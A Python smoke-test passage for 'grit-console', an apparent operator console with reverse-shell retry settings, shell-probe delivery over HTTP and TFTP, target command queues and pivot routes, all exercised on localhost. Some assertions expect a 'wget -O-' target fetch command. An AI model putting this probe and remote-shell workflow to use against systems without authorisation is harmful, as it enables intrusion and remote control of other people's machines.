#!/usr/bin/env python3
import argparse
import contextlib
import hashlib
import io
import json
import os
import pty
import re
import runpy
import select
import signal
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
SECTION_DESCRIPTIONS = {
    "full": "complete grit-console smoke: integration plus line-console workflow",
    "preflight": "fast static/API checks for help text, status fields, and safety guards",
    "probe-delivery": "focused TFTP probe delivery listener checks",
    "integration": "long runtime integration checks for listeners, workflows, status, and file service",
    "integration-bridge-probe": "integration checkpoint through bridge profiles and probe workflows",
    "integration-command-queue": "integration checkpoint through command queue workflows",
    "integration-daemon-status": "integration checkpoint through daemon, service, status, and event workflows",
    "line-console": "isolated line-oriented console command workflow smoke",
}
SECTIONS = tuple(SECTION_DESCRIPTIONS)


def line_console_artifact_dir():
    explicit = os.environ.get("LINE_CONSOLE_ARTIFACT_DIR")
    if explicit:
        return Path(explicit)
    root = Path(os.environ.get("ARTIFACT_ROOT", str(ROOT / "tests" / "artifacts")))
    return root / "line-console"


def line_console_raw_python_repr_present(text):
    text = text or ""
    patterns = (
        r"<[^>\n]+ object at 0x[0-9a-fA-F]+>",
        r"\b(?:defaultdict|OrderedDict)\(",
        r"\{'[^'\n]+':",
        r"\['[^'\n]+'(?:,\s*'[^'\n]+')*\]",
    )
    return any(re.search(pattern, text) for pattern in patterns)


def line_console_raw_action_state_present(text):
    text = text or ""
    raw_states = (
        "needs-input",
        "queueable-offline",
        "background-ready",
        "confirm-required",
        "already-stopped",
    )
    return any(state in text for state in raw_states)


def run(*args):
    return subprocess.run(args, cwd=ROOT, text=True, capture_output=True)


def run_pty_script(proc, master_fd, input_bytes, timeout=8):
    output = bytearray()
    done = threading.Event()

    def drain():
        while not done.is_set():
            try:
                ready, _w, _x = select.select([master_fd], [], [], 0.05)
            except (OSError, ValueError):
                break
            if not ready:
                continue
            try:
                chunk = os.read(master_fd, 65536)
            except OSError:
                break
            if not chunk:
                break
            output.extend(chunk)

    reader = threading.Thread(target=drain, daemon=True)
    reader.start()
    os.write(master_fd, input_bytes)
    try:
        _stdout, stderr = proc.communicate(timeout=timeout)
    finally:
        done.set()
        reader.join(timeout=1)
        while True:
            try:
                ready, _w, _x = select.select([master_fd], [], [], 0)
            except (OSError, ValueError):
                break
            if not ready:
                break
            try:
                chunk = os.read(master_fd, 65536)
            except OSError:
                break
            if not chunk:
                break
            output.extend(chunk)
    return bytes(output), stderr


def write_line_console_artifacts(stdout_text, stderr_text, returncode, summary=None):
    artifact_dir = line_console_artifact_dir()
    artifact_dir.mkdir(parents=True, exist_ok=True)
    (artifact_dir / "transcript.txt").write_text(stdout_text or "", encoding="utf-8")
    (artifact_dir / "stderr.txt").write_text(stderr_text or "", encoding="utf-8")
    summary_doc = {
        "kind": "line-console-transcript",
        "returncode": returncode,
        "artifact_dir": str(artifact_dir),
        "transcript": str(artifact_dir / "transcript.txt"),
        "stderr": str(artifact_dir / "stderr.txt"),
        "prompt_count": (stdout_text or "").count("grit["),
        "traceback_present": "Traceback" in ((stdout_text or "") + (stderr_text or "")),
        "raw_python_repr_present": line_console_raw_python_repr_present(stdout_text),
        "raw_action_state_present": line_console_raw_action_state_present(stdout_text),
        "literal_ctrl_c_present": "^C" in (stdout_text or ""),
        "headless_command_default_spam_present": "headless_command:" in (stdout_text or ""),
        "headless_command_event_summary_present": "headless_command=" in (stdout_text or ""),
        "stale_numbered_result_error_present": "search result number out of range" in (stdout_text or ""),
        "verbose_policy_dump_present": any(
            marker in (stdout_text or "")
            for marker in ("allowed_commands=", "delivery_policy_counts:", "mode status:")
        ),
    }
    if summary:
        summary_doc.update(summary)
    (artifact_dir / "summary.json").write_text(
        json.dumps(summary_doc, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    return artifact_dir


def free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def recv_all(sock):
    out = b""
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            return out
        out += chunk


def connect_with_retry(port, payload, tls_context=None):
    deadline = time.time() + 5
    last = None
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.5) as raw:
                if tls_context:
                    with tls_context.wrap_socket(raw, server_hostname="grit") as conn:
                        conn.sendall(payload)
                        return recv_all(conn)
                raw.sendall(payload)
                return recv_all(raw)
        except (ConnectionRefusedError, TimeoutError, OSError) as exc:
            last = exc
            time.sleep(0.05)
    raise RuntimeError(f"server did not open port {port}: {last}")


def tftp_get_with_retry(port, filename, timeout=5):
    deadline = time.time() + timeout
    last = None
    rrq = b"\x00\x01" + filename.encode("ascii") + b"\0octet\0"
    while time.time() < deadline:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.settimeout(0.5)
                sock.sendto(rrq, ("127.0.0.1", port))
                chunks = []
                expected = 1
                while True:
                    packet, addr = sock.recvfrom(516)
                    opcode = int.from_bytes(packet[:2], "big") if len(packet) >= 2 else 0
                    if opcode == 5:
                        raise RuntimeError(packet[4:].split(b"\0", 1)[0].decode("ascii", "replace"))
                    if opcode != 3:
                        raise RuntimeError(f"unexpected TFTP opcode {opcode}")
                    block = int.from_bytes(packet[2:4], "big")
                    if block != expected:
                        raise RuntimeError(f"unexpected TFTP block {block}, expected {expected}")
                    data = packet[4:]
                    chunks.append(data)
                    sock.sendto(b"\x00\x04" + packet[2:4], addr)
                    if len(data) < 512:
                        return b"".join(chunks)
                    expected += 1
        except (ConnectionRefusedError, TimeoutError, OSError, RuntimeError) as exc:
            last = exc
            time.sleep(0.05)
    raise RuntimeError(f"TFTP server did not serve {filename}: {last}")


def run_local_ips_cache_check(server):
    ns = runpy.run_path(str(server), run_name="__grit_console_smoke__")
    globals_ns = ns["local_ips"].__globals__
    mod_socket = globals_ns["socket"]
    original_getaddrinfo = mod_socket.getaddrinfo
    globals_ns["LOCAL_IPS_SLOW_LOOKUP_SEC"] = 0.01
    globals_ns["LOCAL_IPS_SLOW_CACHE_SEC"] = 1.0
    globals_ns["LOCAL_IPS_CACHE"].update({"until": 0.0, "hostname_ips": [], "slow": False})

    def slow_getaddrinfo(*_args, **_kwargs):
        time.sleep(0.2)
        return []

    mod_socket.getaddrinfo = slow_getaddrinfo
    try:
        started = time.monotonic()
        ns["local_ips"]()
        first_elapsed = time.monotonic() - started
        started = time.monotonic()
        ns["local_ips"]()
        second_elapsed = time.monotonic() - started
    finally:
        mod_socket.getaddrinfo = original_getaddrinfo
    if first_elapsed > 0.15 or second_elapsed > 0.05:
        print(
            f"grit-console: local_ips slow lookup cache ineffective first={first_elapsed:.3f}s second={second_elapsed:.3f}s",
            file=sys.stderr,
        )
        return 1
    return 0


def run_line_local_ips_check():
    scripts_dir = str(ROOT / "scripts")
    if scripts_dir not in sys.path:
        sys.path.insert(0, scripts_dir)
    from gritlib.line_configure import (
        find_config_from_survey,
        find_preset_from_survey,
        find_survey_uploads,
        parse_line_config_args,
    )
    from gritlib.line_network import print_line_local_ips
    from gritlib.probe_commands import parse_line_probe_args
    from gritlib.probe_results import (
        append_probe_result,
        clear_line_probe_results,
        line_probe_result_search_records,
    )
    from gritlib.status_indexes import operator_network_status
    import gritlib.operator_network as operator_network

    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        print_line_local_ips({"local_ips": ["192.168.8.2", "10.0.0.5", "127.0.0.1", "10.0.0.5"]})
    text = buf.getvalue()
    if ("Local IPs:" not in text or
            text.find("  10.0.0.5") > text.find("  192.168.8.2") or
            text.count("10.0.0.5") != 1 or
            "127.0.0.1" in text or
            "set GRIT_OPERATOR_SERVER_HOST" not in text):
        print("line local IP renderer did not sort and de-duplicate candidates", file=sys.stderr)
        print(text, file=sys.stderr)
        return 1
    original_local_ips = operator_network.local_ips
    operator_network.local_ips = lambda: ["192.168.8.2", "10.0.0.5", "127.0.0.1"]
    try:
        if operator_network.operator_advertised_host({}) != "10.0.0.5":
            print("operator advertised host did not use sorted local IP candidates", file=sys.stderr)
            return 1
        if operator_network.target_visible_host("0.0.0.0", {}) != "10.0.0.5":
            print("target-visible host did not use sorted local IP candidates", file=sys.stderr)
            return 1
    finally:
        operator_network.local_ips = original_local_ips
    candidates = operator_network.local_ip_choice_candidates([
        "192.168.8.2", "10.0.0.5", "127.0.0.1", "10.0.0.5",
    ])
    if candidates != ["10.0.0.5", "192.168.8.2"]:
        print("operator local IP choice candidates were not sorted for interactive prompts", file=sys.stderr)
        print(candidates, file=sys.stderr)
        return 1
    status = operator_network_status(["192.168.8.2", "10.0.0.5", "127.0.0.1", "10.0.0.5"])
    if (status.get("selected_local_ip") != "10.0.0.5" or
            [rec.get("ip") for rec in status.get("operator_network_records") or []] != ["10.0.0.5", "192.168.8.2"]):
        print("operator network status did not sort and de-duplicate local IP candidates", file=sys.stderr)
        print(status, file=sys.stderr)
        return 1
    if parse_line_probe_args(["start", "queue"]) != (True, True):
        print("probe start/queue aliases did not map to canonical flags", file=sys.stderr)
        return 1
    if parse_line_config_args(["1", "--write-config", "configs/grit.conf"], "probe config") != (
            "1", "configs/grit.conf", []):
        print("line config parser did not preserve probe config arguments", file=sys.stderr)
        return 1
    if not find_config_from_survey() or not find_preset_from_survey():
        print("line config helpers did not find source-tree survey scripts", file=sys.stderr)
        return 1
    with tempfile.TemporaryDirectory() as tmpdir:
        session_root = Path(tmpdir) / "sessions"
        upload_dir = session_root / "sess-1" / "files"
        upload_dir.mkdir(parents=True)
        survey_path = upload_dir / "survey.json"
        survey_path.write_text('{"schema":1}\n', encoding="utf-8")
        (upload_dir / "survey.metadata.json").write_text(json.dumps({
            "upload_kind": "survey",
            "stored_path": str(survey_path),
            "filename": "survey.json",
        }) + "\n", encoding="utf-8")
        uploads = find_survey_uploads({"session_root": str(session_root)})
        if len(uploads) != 1 or uploads[0].get("stored_path") != str(survey_path):
            print("line config helper did not discover survey uploads", file=sys.stderr)
            return 1
    records = [{"uname_m": "armv7l", "uname_r": "4.1.8", "remote_addr": "192.0.2.1"}]
    search_records = line_probe_result_search_records(records)
    if not search_records or search_records[0].get("use_hint") != "probe config 1":
        print("probe result search records did not preserve numbered config hints", file=sys.stderr)
        return 1
    with tempfile.TemporaryDirectory() as tmpdir:
        cfg = {"operator_session_dir": tmpdir}
        append_probe_result(cfg, {"received_at": "2026-06-03T12:00:00Z", "remote_addr": "192.0.2.44"})
        events = []
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            removed = clear_line_probe_results(
                cfg, ["1"],
                append_event_fn=lambda *args, **kwargs: events.append((args, kwargs)),
            )
        text = buf.getvalue()
        if removed != 1 or "cleared 1 probe result(s)" not in text or not events:
            print("probe result clear wrapper did not clear and emit event details", file=sys.stderr)
            return 1
    return 0


def run_line_repl_runtime_check():
    scripts_dir = str(ROOT / "scripts")
    if scripts_dir not in sys.path:
        sys.path.insert(0, scripts_dir)
    from gritlib.line_repl_runtime import read_line

    reasons = []

    def request_shutdown(reason):
        reasons.append(reason)

    shutdown = threading.Event()
    if read_line(
            "prompt> ",
            shutdown_event=shutdown,
            request_shutdown_func=request_shutdown,
            have_readline=True,
            input_func=lambda _prompt: (_ for _ in ()).throw(EOFError())) is not None:
        print("line REPL runtime did not return None on readline EOF", file=sys.stderr)
        return 1
    if reasons != ["input_eof"]:
        print(f"line REPL runtime did not preserve readline EOF reason: {reasons}", file=sys.stderr)
        return 1

    reasons.clear()
    output = io.StringIO()
    input_stream = io.StringIO("hello\n")
    line = read_line(
        "prompt> ",
        shutdown_event=shutdown,
        request_shutdown_func=request_shutdown,
        have_readline=False,
        stdin=input_stream,
        stdout=output,
        select_func=lambda readers, _writers, _errors, _timeout: (readers, [], []),
    )
    if line != "hello" or output.getvalue() != "prompt> " or reasons:
        print("line REPL runtime fallback did not read and strip one line cleanly", file=sys.stderr)
        return 1

    reasons.clear()
    eof_line = read_line(
        "prompt> ",
        shutdown_event=shutdown,
        request_shutdown_func=request_shutdown,
        have_readline=False,
        stdin=io.StringIO(""),
        stdout=io.StringIO(),
        select_func=lambda readers, _writers, _errors, _timeout: (readers, [], []),
    )
    if eof_line is not None or reasons != ["input_eof"]:
        print(f"line REPL runtime fallback did not preserve EOF reason: line={eof_line!r} reasons={reasons}", file=sys.stderr)
        return 1

    reasons.clear()

    def raise_select_error(_readers, _writers, _errors, _timeout):
        raise ValueError("closed input")

    error_line = read_line(
        "prompt> ",
        shutdown_event=shutdown,
        request_shutdown_func=request_shutdown,
        have_readline=False,
        stdin=io.StringIO("ignored\n"),
        stdout=io.StringIO(),
        select_func=raise_select_error,
    )
    if error_line is not None or reasons != ["input_error"]:
        print(f"line REPL runtime fallback did not preserve input error reason: line={error_line!r} reasons={reasons}", file=sys.stderr)
        return 1
    return 0


def request_with_retry(port, payload):
    deadline = time.time() + 5
    last = None
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.5) as raw:
                raw.sendall(payload)
                return raw.recv(65536)
        except (ConnectionRefusedError, TimeoutError, OSError) as exc:
            last = exc
            time.sleep(0.05)
    raise RuntimeError(f"server did not open port {port}: {last}")


def start_one_shot_echo_server():
    ready = threading.Event()
    done = threading.Event()
    result = {"port": 0, "error": ""}

    def run_echo():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind(("127.0.0.1", 0))
                sock.listen(1)
                result["port"] = sock.getsockname()[1]
                ready.set()
                conn, _addr = sock.accept()
                with conn:
                    data = conn.recv(65536)
                    conn.sendall(b"bridge:" + data)
        except OSError as exc:
            result["error"] = str(exc)
        finally:
            done.set()

    thread = threading.Thread(target=run_echo, name="grit-bridge-echo")
    thread.start()
    if not ready.wait(5):
        raise RuntimeError("echo server did not start")
    return result, done, thread


def write_upload_fixture(tmp):
    upload_port = free_port()
    upload_cfg = Path(tmp) / "server-config-upload.json"
    session_root = Path(tmp) / "sessions-upload"
    upload_operator_dir = Path(tmp) / "operator-session-upload"
    upload_cfg.write_text(json.dumps({
        "GRIT_OPERATOR_FILE_SERVICE_ENABLE": "yes",
        "listen_host": "127.0.0.1",
        "GRIT_OPERATOR_FILE_SERVICE_PORT": upload_port,
        "GRIT_PROBE_PORT": free_port(),
        "GRIT_PROBE_TFTP_PORT": free_port(),
        "session_root": str(session_root),
        "operator_session_dir": str(upload_operator_dir),
        "server_state": str(upload_operator_dir / "server-state.json"),
        "staged_files": str(upload_operator_dir / "staged-files.json"),
        "tls_cert": str(Path(tmp) / "shell-server.crt"),
        "tls_key": str(Path(tmp) / "shell-server.key"),
        "GRIT_RSHELL_SESSION_POLICY": "reconnect",
        "GRIT_RSHELL_RETRY_COUNT": "2",
        "GRIT_RSHELL_RETRY_INTERVAL_SEC": "3",
        "GRIT_RSHELL_RETRY_JITTER_PCT": "10",
        "GRIT_RSHELL_RETRY_BACKOFF": "linear",
        "GRIT_RSHELL_RETRY_MAX_INTERVAL_SEC": "8",
    }), encoding="utf-8")
    return upload_cfg, session_root


def run_line_console_section(server):
    with tempfile.TemporaryDirectory() as tmp:
        upload_cfg, session_root = write_upload_fixture(Path(tmp))
        return run_line_console_smoke(server, Path(tmp), upload_cfg, session_root)


def run_probe_tftp_smoke(tmp, result_port=None):
    tftp_port = free_port()
    result_port = result_port if result_port is not None else free_port()
    tftp_cfg = Path(tmp) / "probe-tftp-config.json"
    tftp_state = Path(tmp) / "probe-tftp-state.json"
    tftp_operator_dir = Path(tmp) / "operator-session-probe-tftp"
    tftp_cfg.write_text(json.dumps({
        "listen_host": "127.0.0.1",
        "GRIT_OPERATOR_SERVER_HOST": "127.0.0.1",
        "GRIT_PROBE_PORT": result_port,
        "GRIT_PROBE_TFTP_PORT": tftp_port,
        "GRIT_PROBE_NAME": "yourfile.sh",
        "operator_session_dir": str(tftp_operator_dir),
        "server_state": str(tftp_state),
        "session_root": str(Path(tmp) / "probe-tftp-sessions"),
    }), encoding="utf-8")
    tftp_proc = subprocess.Popen(
        [
            "scripts/grit-console",
            "--config", str(tftp_cfg),
            "--transport", "probe-tftp",
            "--timeout", "5",
            "--one-shot",
        ],
        cwd=ROOT,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    tftp_script = tftp_get_with_retry(tftp_port, "yourfile.sh")
    tftp_out, tftp_err = tftp_proc.communicate(timeout=5)
    if (tftp_proc.returncode != 0 or
            b"#!/bin/sh" not in tftp_script or
            b"/probe/result" not in tftp_script or
            "Probe TFTP listener." not in tftp_out):
        print("probe-tftp listener did not serve probe script cleanly", file=sys.stderr)
        print(tftp_out, file=sys.stderr)
        print(tftp_err, file=sys.stderr)
        print(tftp_script.decode("utf-8", errors="replace"), file=sys.stderr)
        return 1
    tftp_status = json.loads(run(
        "scripts/grit-console",
        "--config", str(tftp_cfg),
        "--json-status",
    ).stdout)
    tftp_service = (tftp_status.get("services_by_name") or {}).get("probe-tftp") or {}
    if (tftp_service.get("port") != tftp_port or
            tftp_service.get("protocol") != "udp" or
            not (tftp_status.get("events_by_event") or {}).get("probe_tftp_served")):
        print("json status missing probe-tftp evidence", file=sys.stderr)
        print(json.dumps(tftp_status, indent=2, sort_keys=True), file=sys.stderr)
        return 1
    return 0


def run_probe_delivery_section(server):
    with tempfile.TemporaryDirectory() as tmp:
        rc = run_probe_tftp_smoke(Path(tmp))
    if rc == 0:
        print("grit-console smoke probe-delivery ok")
    return rc



def run_line_console_smoke(server, tmp, upload_cfg, session_root):
    sys.path.insert(0, str(ROOT / "scripts"))
    from gritlib.line_workspace import line_banner_hint, print_line_workspace_snapshot

    workspace_empty_buf = io.StringIO()
    with contextlib.redirect_stdout(workspace_empty_buf):
        print_line_workspace_snapshot({"summary": {}, "targets": [], "sessions": [], "warnings": []})
    workspace_empty_text = workspace_empty_buf.getvalue()
    if (
        "No active workspace items yet." not in workspace_empty_text or
        "probe --start        serve the shell probe and print target commands" not in workspace_empty_text or
        "listeners            see services you can start" not in workspace_empty_text or
        "upload --start FILE  stage a file for target fetch" not in workspace_empty_text
    ):
        print("line-oriented workspace empty state did not expose getting-started guidance", file=sys.stderr)
        print(workspace_empty_text, file=sys.stderr)
        return 1
    banner_hint_text = line_banner_hint({
        "summary": {
            "target_count": 2,
            "mailbox_pending_work_count": 3,
            "poll_overdue_count": 1,
            "staged_count": 2,
            "session_count": 1,
            "bridge_profile_count": 1,
            "listening_count": 0,
        },
        "target_filter": {},
        "warnings": [{"message": "listener down"}],
    })
    if (
        "status (1 warning)" not in banner_hint_text or
        "targets (2)" not in banner_hint_text or
        "use N" not in banner_hint_text or
        "search TERM" not in banner_hint_text or
        "queue (3 pending, 1 overdue)" not in banner_hint_text or
        "files (2)" not in banner_hint_text or
        "sessions (1)" not in banner_hint_text or
        "routes (1)" not in banner_hint_text or
        "workspace" not in banner_hint_text
    ):
        print("line-oriented banner hint did not expose useful counts", file=sys.stderr)
        print(banner_hint_text, file=sys.stderr)
        return 1
    selected_banner_hint_text = line_banner_hint({
        "summary": {
            "mailbox_pending_work_count": 2,
            "listening_count": 1,
        },
        "target_filter": {"active": True},
        "warnings": [],
    })
    if (
        "mailbox (2 pending)" not in selected_banner_hint_text or
        "queue COMMAND" not in selected_banner_hint_text or
        "probe --queue" not in selected_banner_hint_text or
        "download --queue PATH" not in selected_banner_hint_text or
        "clear target" not in selected_banner_hint_text
    ):
        print("line-oriented selected-target banner hint did not expose target actions", file=sys.stderr)
        print(selected_banner_hint_text, file=sys.stderr)
        return 1

    line_console_binary = Path(tmp) / "grit-line-console"
    line_console_binary.write_text("#!/bin/sh\necho grit console binary\n", encoding="utf-8")
    line_console_upload = Path(tmp) / "line-console-upload.txt"
    line_console_upload.write_text("line console upload\n", encoding="utf-8")
    line_console_state = Path(tmp) / "operator-session" / "line-console-state.json"
    line_console_staged = Path(tmp) / "operator-session" / "line-console-staged.json"
    line_console_routes = Path(tmp) / "operator-session" / "line-console-bridge-profiles.json"
    line_console_jobs = Path(tmp) / "operator-session-upload" / "workbench-jobs.json"
    line_console_job_log = Path(tmp) / "operator-session-upload" / "jobs" / "line-console-job.log"
    line_console_job_log.parent.mkdir(parents=True, exist_ok=True)
    line_console_job_log.write_text("line console job log\nline console job tail\n", encoding="utf-8")
    line_console_jobs.write_text(json.dumps({
        "schema": 1,
        "jobs": [
            {
                "id": "line-console-job",
                "action_id": "package-artifact",
                "category": "release",
                "script": "printf line-console-job",
                "command": "printf line-console-job",
                "state": "running",
                "pid": "",
                "log_path": str(line_console_job_log),
                "started_at": "2026-01-01T00:00:00Z",
                "background_supported": True,
                "long_running": True,
            },
        ],
    }, indent=2), encoding="utf-8")
    line_console_build = Path(tmp) / "line-console-build.conf"
    line_console_build.write_text('GRIT_RUNTIME_ROOT="./.grit"\n', encoding="utf-8")
    line_console_resource = Path(tmp) / "line-console.rc"
    line_console_makerc = Path(tmp) / "line-console-saved.rc"
    line_console_resource.write_text(
        "# smoke resource script\n"
        "workspace\n"
        "show listeners\n"
        "search name=file-service\n"
        "resource ignored-nested.rc\n",
        encoding="utf-8",
    )
    line_console_session = session_root / "20260101T000000-file-service"
    line_console_session.mkdir(parents=True, exist_ok=True)
    (line_console_session / "session.log").write_text("console session log\n", encoding="utf-8")
    (line_console_session / "events.jsonl").write_text(json.dumps({"event": "session_smoke"}) + "\n", encoding="utf-8")
    (line_console_session / "session.json").write_text(json.dumps({
        "schema": 1,
        "session_id": line_console_session.name,
        "service": "file-service",
        "path": str(line_console_session),
        "state": "closed",
        "exit_reason": "smoke",
        "started_at": "2026-01-01T00:00:00Z",
        "ended_at": "2026-01-01T00:00:02Z",
        "updated_at": "2026-01-01T00:00:02Z",
        "uploads": [],
        "fetches": [],
        "artifacts": [],
    }), encoding="utf-8")
    line_console_target = run(
        "scripts/grit-console",
        "--config", str(upload_cfg),
        "--state-file", str(line_console_state),
        "--staged-file", str(line_console_staged),
        "--set-target-label", "line-console-target",
        "--target-label", "Console Router",
    )
    if line_console_target.returncode != 0:
        print("line console target setup failed", file=sys.stderr)
        print(line_console_target.stdout, file=sys.stderr)
        print(line_console_target.stderr, file=sys.stderr)
        return 1
    line_console_route_port = free_port()
    line_console_route_dest_port = free_port()
    while line_console_route_dest_port == line_console_route_port:
        line_console_route_dest_port = free_port()
    line_console_added_route_port = free_port()
    while line_console_added_route_port in {line_console_route_port, line_console_route_dest_port}:
        line_console_added_route_port = free_port()
    line_console_added_route_dest_port = free_port()
    while line_console_added_route_dest_port in {line_console_route_port, line_console_route_dest_port, line_console_added_route_port}:
        line_console_added_route_dest_port = free_port()
    line_console_route = run(
        "scripts/grit-console",
        "--config", str(upload_cfg),
        "--state-file", str(line_console_state),
        "--staged-file", str(line_console_staged),
        "--bridge-profiles-file", str(line_console_routes),
        "--target-id", "line-console-target",
        "--target-label", "Console Router",
        "--save-bridge-profile", "console-route",
        "--bridge-port", str(line_console_route_port),
        "--bridge-dest-host", "127.0.0.1",
        "--bridge-dest-port", str(line_console_route_dest_port),
        "--bridge-profile-purpose", "line-console-smoke",
        "--bridge-profile-notes", "line console route",
        "--bridge-hop", f"operator:{line_console_route_port}=rack-hop:9001",
        "--bridge-hop", f"rack-hop:9001=127.0.0.1:{line_console_route_dest_port}",
    )
    if line_console_route.returncode != 0 or "saved bridge profile console-route" not in line_console_route.stdout:
        print("line console route setup failed", file=sys.stderr)
        print(line_console_route.stdout, file=sys.stderr)
        print(line_console_route.stderr, file=sys.stderr)
        return 1

    numeric_listener_cfg = Path(tmp) / "numeric-listener-config.json"
    numeric_listener_state = Path(tmp) / "operator-session" / "numeric-listener-state.json"
    numeric_listener_staged = Path(tmp) / "operator-session" / "numeric-listener-staged.json"
    numeric_listener_cfg.write_text(json.dumps({
        "listen_host": "127.0.0.1",
        "GRIT_OPERATOR_SERVER_HOST": "127.0.0.1",
        "GRIT_PROBE_PORT": free_port(),
        "GRIT_PROBE_TFTP_PORT": free_port(),
        "session_root": str(Path(tmp) / "numeric-listener-sessions"),
        "operator_session_dir": str(Path(tmp) / "numeric-listener-operator-session"),
        "server_state": str(numeric_listener_state),
        "staged_files": str(numeric_listener_staged),
    }), encoding="utf-8")
    numeric_master, numeric_slave = pty.openpty()
    try:
        numeric_proc = subprocess.Popen(
            [
                str(server),
                "--config", str(numeric_listener_cfg),
                "--state-file", str(numeric_listener_state),
                "--staged-file", str(numeric_listener_staged),
            ],
            cwd=ROOT,
            stdin=numeric_slave,
            stdout=numeric_slave,
            stderr=subprocess.PIPE,
            text=True,
            env={**os.environ, "TERM": "dumb", "PAGER": "cat"},
        )
        os.close(numeric_slave)
        numeric_slave = -1
        time.sleep(0.3)
        os.write(
            numeric_master,
            b"listener probe-http\n?\noptions\nback\nlisteners\nstart 1\nlistener 1\noptions\nback\nstop 1\nlistener 1\noptions\nback\nq\nq\n",
        )
        numeric_chunks = []
        deadline = time.time() + 8
        while numeric_proc.poll() is None and time.time() < deadline:
            ready, _, _ = select.select([numeric_master], [], [], 0.1)
            if ready:
                try:
                    numeric_chunks.append(os.read(numeric_master, 65536).decode("utf-8", errors="replace"))
                except OSError:
                    break
        if numeric_proc.poll() is None:
            numeric_proc.terminate()
            try:
                numeric_proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                numeric_proc.kill()
                numeric_proc.wait(timeout=2)
        numeric_stdout = "".join(numeric_chunks)
        numeric_stderr = numeric_proc.stderr.read()
    finally:
        if numeric_slave != -1:
            os.close(numeric_slave)
        try:
            os.close(numeric_master)
        except OSError:
            pass
    numeric_options_start = numeric_stdout.find("grit[all]/listener/probe> options")
    numeric_options_end = numeric_stdout.find("grit[all]/listener/probe> back", numeric_options_start + 1)
    numeric_listener_help_start = numeric_stdout.find("grit[all]/listener/probe> ?")
    numeric_listener_help_end = numeric_stdout.find("grit[all]/listener/probe> options", numeric_listener_help_start + 1)
    numeric_listener_help_text = (
        numeric_stdout[numeric_listener_help_start:numeric_listener_help_end]
        if numeric_listener_help_start != -1 and numeric_listener_help_end != -1 else ""
    )
    if "grit[all]/service/probe>" in numeric_stdout:
        print("line console listener selection still used service/probe prompt", file=sys.stderr)
        print(numeric_stdout, file=sys.stderr)
        return 1
    if (not numeric_listener_help_text or
            "Help: listeners" not in numeric_listener_help_text or
            "Console help topics:" in numeric_listener_help_text or
            "grit[all]/listeners> listeners" not in numeric_stdout):
        print("line console context help/back did not follow listener breadcrumbs", file=sys.stderr)
        print(numeric_stdout, file=sys.stderr)
        return 1
    numeric_options_text = (
        numeric_stdout[numeric_options_start:numeric_options_end]
        if numeric_options_start != -1 and numeric_options_end != -1 else ""
    )
    numeric_started_options_start = numeric_stdout.find("grit[all]/listener/probe> options", numeric_options_end + 1)
    numeric_started_options_end = numeric_stdout.find("grit[all]/listener/probe> back", numeric_started_options_start + 1)
    numeric_started_options_text = (
        numeric_stdout[numeric_started_options_start:numeric_started_options_end]
        if numeric_started_options_start != -1 and numeric_started_options_end != -1 else ""
    )
    numeric_stopped_options_start = numeric_stdout.find("grit[all]/listener/probe> options", numeric_started_options_end + 1)
    numeric_stopped_options_end = numeric_stdout.find("grit[all]/listener/probe> back", numeric_stopped_options_start + 1)
    numeric_stopped_options_text = (
        numeric_stdout[numeric_stopped_options_start:numeric_stopped_options_end]
        if numeric_stopped_options_start != -1 and numeric_stopped_options_end != -1 else ""
    )
    if (numeric_proc.returncode != 0 or
            "Traceback" in (numeric_stderr or "") or
            "probe-http  " not in numeric_stdout or
            "transport: probe" not in numeric_stdout or
            not numeric_options_text or
            "Target command:" in numeric_options_text or
            "wget -O- http://" in numeric_options_text or
            not numeric_started_options_text or
            "Target command:" not in numeric_started_options_text or
            "wget -O- http://" not in numeric_started_options_text or
            not numeric_stopped_options_text or
            "Target command:" in numeric_stopped_options_text or
            "wget -O- http://" in numeric_stopped_options_text or
            "started probe:" not in numeric_stdout or
            "stopped probe:" not in numeric_stdout or
            "service or route not found: 1" in numeric_stdout):
        print("line console numbered listener start/stop UX failed", file=sys.stderr)
        print(numeric_stdout, file=sys.stderr)
        print(numeric_stderr or "", file=sys.stderr)
        return 1

    line_console_master, line_console_slave = pty.openpty()
    try:
        line_console_proc = subprocess.Popen(
            [
                str(server),
                "--config", str(upload_cfg),
                "--state-file", str(line_console_state),
                "--staged-file", str(line_console_staged),
                "--bridge-profiles-file", str(line_console_routes),
                "--build-config", str(line_console_build),
            ],
            cwd=ROOT,
            stdin=line_console_slave,
            stdout=line_console_slave,
            stderr=subprocess.PIPE,
            text=True,
            env={**os.environ, "TERM": "dumb", "PAGER": "cat"},
        )
        os.close(line_console_slave)
        line_console_slave = -1
        time.sleep(0.3)
        os.write(
            line_console_master,
            (
                "\n"
                "help\n"
                "?\n"
                "help search\n"
                "help resource\n"
                "help makerc\n"
                "help aliases\n"
                "help use\n"
                "help sessions\n"
                "help modules\n"
                "help routes\n"
                "help actions\n"
                "help next\n"
                "help main\n"
                "help setg\n"
                "help jobs\n"
                "help run\n"
                "help history\n"
                "help complete\n"
                "help commands\n"
                "help events\n"
                "help view\n"
                "help download\n"
                "help survey\n"
                "help fetch\n"
                "help queue\n"
                "help build\n"
                "route add\n"
                "complete\n"
                "complete use ag\n"
                "complete agent Con\n"
                "complete route a\n"
                "complete route d\n"
                "complete route st\n"
                "complete start route c\n"
                "complete use job\n"
                "complete show m\n"
                "complete use module operator-daemon\n"
                "complete copy\n"
                "complete view\n"
                "help files\n"
                f"resource {line_console_resource}\n"
                "workspace\n"
                "next\n"
                "status\n"
                "!!\n"
                "history 8\n"
                f"makerc {line_console_makerc}\n"
                "repeat 1\n"
                "search name=file-service\n"
                "show agents\n"
                "use 1\n"
                "clear target\n"
                "show listeners\n"
                "use 1\n"
